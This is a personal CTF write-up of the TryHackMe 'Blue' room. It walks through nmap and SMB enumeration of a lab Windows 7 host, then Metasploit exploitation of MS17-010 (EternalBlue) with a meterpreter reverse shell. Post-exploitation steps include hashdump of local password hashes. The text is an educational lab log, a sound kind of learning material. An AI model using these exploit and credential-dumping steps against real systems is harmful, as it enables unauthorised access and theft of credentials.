# TryHackMe: Blue
**Difficulty:** Easy
**Focus:** SMB enumeration, exploit EternalBlue vulnerability
**Tools Used:** nmap, smbclient, Metasploit

---

## 🕵️‍♂️ Enumeration

### Nmap scan
nmap -sC -sV -oN blue.txt[TARGET_IP]

### SMB shares
smbclient -L \[TARGET_IP] -N

---
## 🎯 Exploitation
Used Metasploit's EternalBlue module:

use/exploit/windows/smb/ms17_010_eternalblue

---
## 🧠 Lessons Learned
- How to identify vulnerable SMB services
- How EternalBlue exploits MS17-010
- Importance of patching critical vulnerabilities

---
# TryHackMe: Blue

**Room Link:** [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)  
**Difficulty:** Easy  
**Objective:** Exploit the MS17-010 (EternalBlue) vulnerability in an unpatched Windows 7 machine using enumeration, Metasploit, and post-exploitation skills.

---

## 🖥️ Target Info

- **IP Address:** 10.10.241.131
- **Operating System:** Windows 7 SP1
- **Vulnerability:** MS17-010 / EternalBlue
- **Exploitation Tool:** Metasploit

---

## 🔎 Enumeration

### Nmap Command

nmap -sC -sV -oN blue.txt 10.10.241.131

**Key Findings**
- *Port 445 (SMB)* is open.
- Detected service: microsoft-ds Windows 7 Professional 7601 Service Pack 1
- Nmap script output:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143

---
## ⚔️ Exploitation - Metasploit
Initial Setup
- msfconsole
- use exploit/windows/smb/ms17_010_eternalblue
- set RHOSTS 10.10.241.131

### LHOST Challenge: Interface Troubleshooting
Initially, I attempted to set ```LHOST``` using common defaults like ```tun0``` or ```eth0```, but the ```ip a``` output showed no such interfaces.
Instead, my system listed:
- ```ens5``` -- primary TryHackMe interface
- ```docker0``` and multiple ```veth``` interfaces -- related to containers, **not usable**
I then used the following command to set the ```LHOST```:
- ```set LHOST ens5```
### Payload and Execution

```set PAYLOAD windows/x64/meterpreter/reverse_tcp```

```run```

### Post-Exploitation
Once access was gained, I executed the following:
- ```sysinfo``` - to confirm OS and architecture
- ```getuid``` - to check user context (got SYSTEM access)
- ```hashdump``` to collect local user hashes
- Retrieved flag from ```C:\Users\Bob\Desktop\flag.txt

---
# 🧠 Lessons Learned
- **Enumeration matters:** Nmap scripts quick confirmed MS17_010
- **Interface mismatches** are a common but solable issue in lab environments.
- **Adaptability is key** - when the default exploit path fails, adjusting payloads or parameters often resolves it.
- Even in controlled environments, **debugging network paths** and session failures simulates real-world troubleshooting.




